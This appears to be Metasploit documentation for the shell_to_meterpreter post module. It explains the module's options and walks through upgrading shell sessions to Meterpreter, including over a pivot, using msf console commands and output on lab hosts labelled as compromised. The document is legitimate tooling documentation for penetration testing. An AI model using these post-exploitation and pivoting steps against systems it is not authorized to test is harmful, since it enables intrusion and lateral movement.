`shell_to_meterpreter` allows you to upgrade a shell session to Meterpreter. It can be launched as
a post module, or from the `sessions` command. By default, this module will use a reverse
Meterpreter.

## Important Options

**HANDLER**

The handler option is for starting a multi/handler to receive the connection. By default this is
true, because you will need it. But if for some reason if you're setting one separately, you may
want to consider having it as false.

**LHOST**

The LHOST option is for the reverse Meterpreter you are upgrading to. By default, the module can
figure it out for you. But over a pivot, you will need to manually set this, because session
objects don't necessarily have that information.

**LPORT**

The LPORT option is also for the reverse Meterpreter you are upgrading to.

**PAYLOAD_OVERRIDE**

This is an advanced option. If you don't want to use the default reverse Meterpreter, then you can
use this.

## Scenarios

**Using sessions -u**

`sessions -u` is the same as running the post module against a specific session. However, this
is limited to using the default reverse Meterpreter payload, so you will not be able to use it
via a pivot.

Usage is rather simple. At the msf prompt, first off, read the sessions table to see which one you
want to upgrade:

```
msf > sessions

Active sessions
===============

  Id  Type           Information  Connection
  --  ----           -----------  ----------
  1   shell windows               192.168.146.1:4444 -> 192.168.146.128:1204 (192.168.146.128)

msf >
```

In this demonstration, session 1 is a shell, so we upgrade that:

```
msf > sessions -u 1
```

**Upgrading a shell via a pivot**

This scenario is a little tricky, because the default options won't work over a pivot. The problem
is that if you got a session with a bindshell, your LHOST will say "Local Pipe". And if you got it
with a reverse shell, the LHOST is actually an IP range. Neither is an acceptable format for the
LHOST option.

There are two ways you can choose: either you must manually set LHOST, or you could choose a
bind Meterpreter. The second is really easy, all you need to do is ```set PAYLOAD_OVERRIDE```.

If you prefer to manually set LHOST, this should be the compromised host you're pivoting from.
Perhaps a digram will help to explain this:

```
|-------------|       |-------------------|       |-------------------|
|   Attacker  | <---> | Compromised box A | <---> | Compromised box B |
|-------------|       |-------------------|       |-------------------|
 192.168.146.1         192.168.146.128
                       192.168.1.101 (VPN)          192.168.1.102(VPN)
```

In this example, let's start with breaking into box A (192.168.146.128):

```
[*] Sending stage (957999 bytes) to 192.168.146.128
[*] Meterpreter session 1 opened (192.168.146.1:4444 -> 192.168.146.128:1208) at 2016-04-28 22:45:09 -0500

meterpreter >
```

We decide that box A is on a VPN, with IP 192.168.1.101. Also, we found box B as 192.168.1.102. We
need to create that pivot:

```
msf > route add 192.168.1.1 255.255.255.0 1
[*] Route added
```

And we break into box B (192.168.1.102) with a Windows bind shell:

```
[*] Command shell session 2 opened (Local Pipe -> Remote Pipe) at 2016-04-28 22:47:03 -0500
```

Notice this says "Local Pipe", which means the box B's session object doesn't really know box A's IP.
If you try to run shell_to_meterpreter this way, this is all you get:

```
msf post(shell_to_meterpreter) > run

[*] Upgrading session ID: 2
[-] LHOST is "Local Pipe", please manually set the correct IP.
[*] Post module execution completed
```

To upgrade box B's shell, set LHOST to box A's 192.168.1.101. And that should connect correctly:

```
msf post(shell_to_meterpreter) > run

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.1.101:4433 via the meterpreter on session 1
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.102
[-] Powershell is not installed on the target.
[*] Command stager progress: 1.66% (1699/102108 bytes)
...
[*] Command stager progress: 100.00% (102108/102108 bytes)
[*] Meterpreter session 3 opened (192.168.146.1-192.168.146.128:4433 -> 192.168.1.102:1056) at 2016-04-28 22:50:56 -0500
```
